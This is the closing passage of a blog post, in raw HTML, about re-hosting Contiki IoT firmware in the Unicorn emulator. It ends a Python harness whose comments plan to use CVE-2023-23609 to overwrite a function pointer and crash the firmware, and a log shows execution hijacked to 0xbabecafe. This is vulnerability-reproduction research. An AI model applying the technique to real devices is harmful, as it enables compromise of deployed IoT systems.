    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210768</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\x47</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch wfi</span>
    <span class="c1"># why not push pc, or mov pc,lr</span>

    <span class="c1"># init SP</span>
    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
    
    <span class="c1"># hooks</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="c1"># print(a)</span>


    <span class="c1"># interrupt(mu, 2, )</span>

    <span class="c1"># TODO: run until</span>
    <span class="c1"># 00210768  30bf       wfi</span>

    <span class="c1"># TODO: inject RF data available IRQ</span>
    <span class="c1"># TODO: reach input_l2cap_conn_req</span>
    
    <span class="c1"># TODO: use CVE-2023-23609 to overwrite:</span>
    <span class="c1"># 200010e4  uint32_t notification_process = 0x0</span>
    <span class="n">notification_process</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x200010e8</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;notification_process = </span><span class="si">{</span><span class="n">notification_process</span><span class="si">:</span><span class="s1">08x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20001268</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">))</span>

    <span class="c1"># TODO: inject irq 160 and crash firmware</span>

<span class="n">main</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>å®åœ¨æ˜¯ä¸‘é™‹ä¸å ªï¼Œä½†æ˜¯èƒ½ç”¨ï¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">...
[hook block] 0x203d6c, 2, None
[hook block] 0x203d5a, 4, None
Interrupted...
[hook block] 0x205114, 24, None
[hook block] 0x20512c, 6, None
[hook block] 0x205132, 4, None
[hook block] 0x2052e8, 2, None
[hook block] 0x2052ea, 10, None
0x2052F0: p-&gt;state - 1  0x0
[hook block] 0x2052f6, 10, None
[hook block] 0x2052f4, 2, None
[hook block] 0x205136, 6, None
ok
[hook block] 0x205494, 8, None
0x205498: poll_requested  1
[hook block] 0x2054ac, 4, None
[hook block] 0x2053d8, 14, None
[hook block] 0x2053e8, 2, None
[hook block] 0x2053ea, 6, None
[hook block] 0x2053f0, 16, None
[hook block] 0x205398, 10, None
[hook block] 0x2053a2, 8, None
[hook block] 0x2053aa, 14, None
[hook_mem_unmapped] 21, babecafe, 4, 0, None
0xbabecafe Bingo!!
</code></pre></td></tr></table>
</div>
</div><h2 id="ç»“æŸäº†å—">ç»“æŸäº†å—ï¼Ÿ</h2>
<p>æœ¬æ–‡è®°å½•äº†åˆæ¬¡ä½¿ç”¨ Unicornï¼Œå¹¶åœ¨æ²¡æœ‰ä»»ä½•ç¡¬ä»¶çš„æƒ…å†µä¸‹å¯¹æŸç‰©è”ç½‘ OS å›ºä»¶è¿›è¡Œè½¯ä»¶æ¨¡æ‹Ÿï¼Œå¹¶å¤ç°æŸä¸ªè¾ƒæ˜“åˆ©ç”¨çš„æ¼æ´çš„è¿‡ç¨‹ã€‚ç¬”è€…å¯¹è‡ªå·±å†™çš„æ¨¡æ‹Ÿä»£ç ç›¸å½“ä¸æ»¡æ„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸å°‘åœ°æ–¹å¯ä»¥æ·±ç©¶ã€‚ä½†ç›®å‰æ‰“ç®—æš‚æ”¾ä¸€ä¸‹ï¼Œå¸Œæœ›å‡ ä¸ªæœˆåå›é¡¾è¿™ç¯‡æ–‡ç« æ—¶ä¼šè§‰å¾—æ¼æ´ç™¾å‡ºï¼Œä¾æ‰˜ç­”è¾©ã€‚æ”¶å·¥ï¼</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-09-27</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2023/09/re-host/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2023/09/re-host/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on å¾®åš" data-sharer="weibo" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting å°è®°"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2023/05/rev_main/" class="prev" rel="prev" title="é€†å‘æ–¹æ³•è®º"><i class="fas fa-angle-left fa-fw"></i>é€†å‘æ–¹æ³•è®º</a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">ğŸ´â€â˜ ï¸ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
